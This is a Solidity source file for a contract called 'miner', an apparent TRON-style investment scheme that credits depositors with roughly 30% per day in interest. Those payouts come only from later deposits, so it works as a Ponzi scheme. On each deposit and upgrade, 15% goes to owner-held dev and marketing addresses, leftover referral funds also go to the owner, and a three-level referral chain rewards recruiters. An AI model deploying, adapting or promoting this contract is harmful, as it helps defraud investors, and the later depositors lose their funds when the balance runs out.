pragma solidity ^0.4.25;

contract miner{

    using SafeMath for uint256;

    uint constant PERIOD = 1 minutes;

    uint public totalPlayers;
    uint public totalPayout;
    uint private minDepositSize = 10000000;
    uint private minuteInterestRateDivisor = 100000000;
    uint private devCommission = 3;
    uint private marketingComission = 12;
    uint private commissionDivisor = 100;
    uint private minuteRate=20833;
    bool private initialState;

    address private owner;
    address private devAddress;
    address private marketingAddress;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; //3 level
        uint256 aff2sum;
        uint256 aff3sum;
    }

    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;
      devAddress = msg.sender;
      marketingAddress = msg.sender;
      initialState = true;
    }


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(msg.value >= minDepositSize);
        if(initialState) {
            require(owner == msg.sender, "only allowed address");
            initialState=false;
        }
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }

        collect(msg.sender);
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        distributeRef(msg.value, player.affFrom);

        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        devAddress.transfer(devEarn);
        uint marketingReserve = depositAmount.mul(marketingComission).div(commissionDivisor);
        marketingAddress.transfer(marketingReserve);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function upgrade() public{
        Player storage player = players[msg.sender];
        collect(msg.sender);

        require(player.interestProfit > minDepositSize);
        uint contractBalance = address(this).balance;
        require(contractBalance>0);
        uint upgradeValue = player.interestProfit > contractBalance ? contractBalance : player.interestProfit;
        player.interestProfit = player.interestProfit.sub(upgradeValue);
        player.trxDeposit = player.trxDeposit.add(upgradeValue);

        uint devEarn = upgradeValue.mul(devCommission).div(commissionDivisor);
        devAddress.transfer(devEarn);
        uint marketingReserve = upgradeValue.mul(marketingComission).div(commissionDivisor);
        marketingAddress.transfer(marketingReserve);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint minutePassed = ( now.sub(player.time) ).div(PERIOD);
        if (minutePassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(minutePassed.mul(minuteRate))).div(minuteInterestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add( minutePassed.mul(PERIOD) );
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
       }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint minutePassed = ( now.sub(player.time) ).div(PERIOD);
      if (minutePassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(minutePassed.mul(minuteRate))).div(minuteInterestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}